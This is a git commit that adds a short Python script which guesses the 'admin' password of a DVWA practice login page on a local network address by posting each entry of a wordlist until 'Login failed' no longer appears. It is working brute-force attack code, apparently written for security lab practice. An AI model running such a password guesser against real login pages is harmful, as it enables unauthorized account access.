f9cbd18ce05982bba28c9c8b7ed1467b5642107a
benQEMUKali <benro2211@gmail.com>
2022-04-23 16:28:19 -0600

    simple password guesser for dvwa login

---
+++ dvwaPassword.py
@@ -0,0 +1,22 @@
+import requests, json
+def post(url):
+	data = {
+	"username": "admin", #name="username"
+	"password": "", #name="blah", use with password list
+	"Login": "submit" #name = "blah"
+	}
+	with open('/opt/wordlists/passwords.txt','r') as rf:
+            for password in rf:
+                password = password.strip()
+                data['password'] = password
+                resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
+                if resp.status_code == 200:
+                    #html = resp.json()
+                    if b'Login failed' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
+                        return (f'Credentials: Username: \'admin\' Password: {password}')
+                
+            return (f'Password not found')
+				
+		
+print(post('http://192.168.86.115/dvwa/login.php'))
+
